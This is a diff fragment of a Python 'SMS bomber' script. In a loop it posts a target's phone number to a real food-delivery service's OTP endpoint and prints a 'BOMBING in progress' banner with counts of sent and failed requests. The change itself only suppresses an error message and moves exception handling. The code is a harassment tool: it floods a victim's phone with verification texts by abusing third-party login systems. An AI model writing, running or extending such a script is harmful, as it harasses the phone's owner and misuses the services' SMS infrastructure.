@@ -387,9 +387,9 @@ while True:
 		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
 		print('[+] Delivery Requests Successful!')
 	except:
-		print('[-] Delivery Requests Failed!')
+		pass
 
-        try:
+
             print("==================================================================")
             print("                BOMBING in progress, please wait !!               ")
             print("==================================================================")
@@ -398,8 +398,6 @@ while True:
             print("             Failed Requests         : ", failed)
             print("             Number of Requests Sent : ", requested)
             print("==================================================================")
-        except:
-               pass
         try:
             failed = 0
             requested = 0
